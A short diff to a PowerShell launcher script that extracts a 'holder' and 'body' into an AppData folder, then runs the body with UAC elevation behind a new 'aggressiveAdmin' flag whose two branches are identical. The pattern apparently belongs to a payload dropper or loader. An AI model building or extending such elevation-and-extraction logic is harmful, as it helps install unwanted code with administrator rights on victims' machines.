@@ -1,5 +1,6 @@
 . ./utils.ps1
 . ./consts_autoextract.ps1
+. ./consts_body.ps1
 
 function checkFolder {
     $appDataFolder = Get-HephaestusFolder
@@ -49,7 +50,16 @@ function Initialization()
     checkFolder
     extract_holder
     extract_body
-    RunMe -script (Get-BodyPath) -argName "" -argValue "" -uac $true
+    if ($server.aggressiveAdmin -eq $true)
+    {
+        RunMe -script (Get-BodyPath) -argName "" -argValue "" -uac $true
+    }
+    else 
+    {
+        RunMe -script (Get-BodyPath) -argName "" -argValue "" -uac $true
+    }
+
+
 }
 
 Initialization
